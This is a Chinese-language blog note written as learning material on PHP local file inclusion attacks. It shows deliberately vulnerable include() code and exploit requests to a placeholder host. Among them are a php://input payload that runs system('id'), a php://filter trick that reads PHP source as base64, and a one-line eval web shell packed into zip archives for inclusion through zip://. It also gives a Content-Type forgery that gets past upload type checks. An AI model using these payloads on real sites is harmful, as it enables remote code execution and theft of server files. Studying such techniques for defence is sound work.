Title: php://input&&php://filter
Category: Learning
Date: 2016-12-28
Slug: php-input

php://input需要服务器的支持，同时要求"allow_url_include"设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：

```
index.php:

<?php
    $b=$_REQUEST["b"];
    @include($b);
 ?>
 
EXP:

GET http://evil.com/index.php?php://input
<?php system("id")?>

获取文件内容：
<?php echo file_get_contents("info.php");?> //测试可用
<?php echo base64_encode(file_get_contents("info.php"));?>  //http://www.cnblogs.com/LittleHann/p/3665062.html 防止获取`.php`文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来


fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
另外一个php伪协议：
 
file=php://filter/read=convert.base64-encode/resource=image.php
用来读取php文件。
 
```
$_FILES[“file”][“type”] 
这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。

### php的zip伪协议

假设有以下的代码：

```
file.php:

<?php
@include($_GET['a'].".jpg");
@include($_GET['b'].".php");


```
明细的包含，对于参数a和参数b可以这样来解决，比如有一个

```
shell.php:

<?php eval($_GET['c']);?>

```

a参数最终包含的是一个jpg，b参数是一个php

```
对于a来说：
mv shell.php shell.jpg
zip a.zip shell.jpg

访问: http://evil.com/file.php?a=zip://a.zip%23shell&c=phpinfo();

对于b来说：
zip b.zip shell.php

访问: http://evil.com/file.php?b=zip://b.zip%23shell&c=phpinfo();

```

有下面这两个例子：第一个ctf比赛，第二个Metinfo5.3.10版本Getshell：
http://www.venenof.com/index.php/archives/179/
https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/

要注意Metinfo5.3.10里面zip的时候带了相对路径，%23后面并没有指定文件，因为压缩的时候带路径，解压缩会自动加上去。